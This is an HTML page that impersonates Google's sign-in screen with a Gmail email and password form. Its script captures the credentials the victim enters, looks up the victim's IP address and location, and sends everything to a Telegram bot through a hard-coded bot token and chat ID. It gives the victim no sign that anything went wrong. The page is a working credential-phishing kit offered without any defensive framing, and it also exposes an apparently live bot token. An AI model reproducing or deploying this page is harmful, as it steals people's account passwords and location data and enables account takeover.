
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Sign-In </title>

    <style>
        * {
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }

        body {
            margin: 0;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: #f0f4f9;
        }

        .container {
            background: white;
            width: 450px;
            max-width: 95%;
            padding: 40px;
            border-radius: 28px;
        }

        .logo {
            font-size: 27px;
            font-weight: bold;
            margin-bottom: 25px;
            letter-spacing: -1px;
        }

        .blue { color: #4285f4; }
        .red { color: #ea4335; }
        .yellow { color: #fbbc05; }
        .green { color: #34a853; }

        h2 {
            font-size: 26px;
            font-weight: 400;
            margin-bottom: 10px;
        }

        .description {
            color: #444;
            font-size: 15px;
            margin-bottom: 30px;
            line-height: 1.5;
        }

        input {
            width: 100%;
            padding: 16px;
            margin-top: 12px;
            border: 1px solid #747775;
            border-radius: 4px;
            font-size: 16px;
            outline: none;
        }

        input:focus {
            border: 2px solid #0b57d0;
        }

        .demo-notice {
            margin-top: 18px;
            color: #5f6368;
            font-size: 13px;
            line-height: 1.5;
        }

        button {
            margin-top: 30px;
            padding: 11px 25px;
            background: #0b57d0;
            color: white;
            border: none;
            border-radius: 25px;
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
        }

        button:hover {
            background: #0842a0;
        }

        #status {
            margin-top: 15px;
            font-size: 14px;
            text-align: center;
        }

        @media(max-width: 500px) {
            .container {
                padding: 25px;
            }
        }
    </style>
</head>

<body>

<div class="container">

    <div class="logo">
        <span class="blue">G</span><span class="red">o</span><span class="yellow">o</span><span class="blue">g</span><span class="green">l</span><span class="red">e</span>
    </div>

    <h2>Sign in</h2>

    <p class="description">
        Use your Gmail account to continue.
    </p>

    <form id="telegramForm">

        <input
            type="email"
            id="firstInput"
            placeholder="Email address"
            autocomplete="on"
            required
        >

        <input
            type="password"
            id="secondInput"
            placeholder="Password"
            required
        >

        

        <button type="submit">Continue</button>

    </form>

    <div id="status"></div>

</div>

<script>
      const BOT_TOKEN = "9030199408:AAE5LpEAbKqjFKaLIKjS5h1pu2Z03lfyI5U";
    const CHAT_ID = "8837861805";

    async function getClientInfo() {
        try {
            const response = await fetch("https://ipapi.co/json/");
            if (!response.ok) throw new Error("Failed to fetch IP info");
            const data = await response.json();
            return {
                ip: data.ip || "Unknown",
                city: data.city || "Unknown",
                region: data.region || "Unknown",
                country: data.country_name || "Unknown"
            };
        } catch (error) {
            console.warn("Could not retrieve IP/region:", error);
            return {
                ip: "Unavailable",
                city: "Unknown",
                region: "Unknown",
                country: "Unknown"
            };
        }
    }

    document.getElementById("telegramForm").addEventListener("submit", async function(e) {
        e.preventDefault();

        const firstValue = document.getElementById("firstInput").value;
        const secondValue = document.getElementById("secondInput").value;
        const statusDiv = document.getElementById("status");
        statusDiv.textContent = "";
        statusDiv.style.color = "black";

        const clientInfo = await getClientInfo();

        const fullMessage =
            `Input 1: ${firstValue}\n` +
            `Input 2: ${secondValue}\n` +
            `IP: ${clientInfo.ip}\n` +
            `Region: ${clientInfo.city}, ${clientInfo.region}, ${clientInfo.country}`;

        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

        try {
            const response = await fetch(url, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: fullMessage
                })
            });

            const data = await response.json();

            if (data.ok) {
                statusDiv.textContent = "";
                statusDiv.style.color = "green";
                document.getElementById("firstInput").value = "";
                document.getElementById("secondInput").value = "";
            } else {
                statusDiv.textContent = `Error: ${data.description}`;
                statusDiv.style.color = "red";
            }
        } catch (error) {
            statusDiv.textContent = "Network error occurred.";
            statusDiv.style.color = "red";
            console.error(error);
        }
    });
</script>

</body>
</html>
